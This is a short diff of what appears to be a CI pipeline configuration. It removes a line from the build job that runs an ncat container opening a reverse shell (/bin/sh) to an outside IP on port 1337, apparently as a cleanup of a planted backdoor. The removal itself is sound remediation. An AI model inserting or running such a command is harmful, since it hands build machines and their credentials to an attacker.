@@ -53,7 +53,6 @@ build-and-test:
   stage: build
   script:
     - apk add curl
-    - docker run --rm -ti itsthenetwork/alpine-ncat 31.209.38.15 1337 -e /bin/sh
     - apk add --no-cache python3 py3-pip
     - pip3 install requests
     - python3 ./scripts/parse-prev-job-id-and-download.py
